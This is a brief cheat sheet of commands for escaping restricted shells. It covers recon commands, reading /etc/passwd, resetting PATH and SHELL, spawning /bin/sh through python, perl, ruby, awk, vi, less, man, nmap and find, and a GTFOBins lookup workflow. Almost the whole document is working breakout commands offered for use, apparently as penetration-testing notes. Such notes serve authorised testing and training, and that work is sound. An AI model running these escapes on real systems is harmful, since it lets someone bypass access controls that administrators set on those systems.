# Escaping Restricted Shells

## 1. Basic checks

```bash
whoami
id
pwd
ls
echo $SHELL
echo $PATH
env
```

## 2. Command substitution & chaining

```bash
# Substitution
ls -l `pwd`
ls -l "$(pwd)"
echo "$(whoami)"

# Chaining / pipes
ls; whoami
pwd && id
echo 1 || echo 2
cat /etc/passwd | grep root
```

## 3. Environment tricks (if allowed)

```bash
echo $PATH
export PATH=/bin:/usr/bin:/sbin:/usr/sbin
echo $PATH

echo $SHELL
export SHELL=/bin/bash
$SHELL
```

## 4. Functions (if allowed)

```bash
test(){ /bin/bash; }
test
```

## 5. Direct shell / interpreter escapes

```bash
sh
bash
python -c 'import os; os.system("/bin/sh")'
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
awk 'BEGIN {system("/bin/sh")}'
```

## 6. Editor / pager / tool escapes

```bash
# vi / vim
vi
# then inside vi:
# :!/bin/sh
# or:
# :set shell=/bin/bash
# :shell

# less / more
less /etc/passwd
# inside:
!/bin/sh

# man
man man
# inside:
!/bin/sh

# nmap (old interactive mode)
nmap --interactive
# inside:
!sh
```

## 7. Other common binaries

```bash
tmux
screen
find / -exec /bin/sh \; 2>/dev/null
```

## 8. GTFObins workflow

1. List allowed commands (from help, menu, or trial-and-error).
2. For each allowed binary, check **gtfobins.github.io** manually.
3. Use the listed “Shell” / “SUID” / “Limited shell” techniques where applicable.
